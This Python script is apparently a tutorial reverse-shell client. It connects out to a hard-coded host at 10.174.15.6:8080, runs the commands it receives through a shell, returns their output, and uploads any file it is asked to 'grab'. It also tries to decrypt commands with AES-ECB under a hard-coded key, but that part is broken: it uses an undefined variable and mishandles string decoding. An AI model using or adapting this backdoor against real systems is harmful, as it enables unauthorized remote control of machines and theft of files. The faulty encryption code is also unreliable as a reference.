import socket
import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y
import os
from Crypto.Cipher import AES
import hashlib
import sys
import binascii
import Padding

password='hello'
ival=10

key = hashlib.sha256(password.encode()).digest()
iv= hex(ival)[2:8].zfill(16)  
#command is the data we will encrypt ie the plaintext

def encrypt(plaintext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.encrypt(plaintext))

def decrypt(ciphertext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.decrypt(ciphertext))



def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send("DONE".encode())
    else:
        s.send("File not found".encode())


def connect():
    s = socket.socket()
    s.connect(("10.174.15.6",8080))
    while True:
        command = s.recv(1024)
        if "terminate" in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            # Recieve the command  
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        else:
            print("Decypting command")
            plaintext = command
            plaintext = decrypt(ciphertext,key,AES.MODE_ECB)
            print("The plain text raw but decrypted",plaintext)
            plaintext = Padding.removePadding(plaintext.decode(),mode=0)
            #print ("  decrypt: "+plaintext)
            
            # See the video above which explains how the subprocess element works
            # A pipe has two endpoints
            CMD = subprocess.Popen(plaintext.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            #Capture the standout and send the output to the server
            s.send(CMD.stdout.read())
            # Capture any command errors and send the 
            s.send(CMD.stderr.read())

def main():
    key = hashlib.sha256(password.encode()).digest()
    
    iv= hex(ival)[2:8].zfill(16)    

    connect()
main()
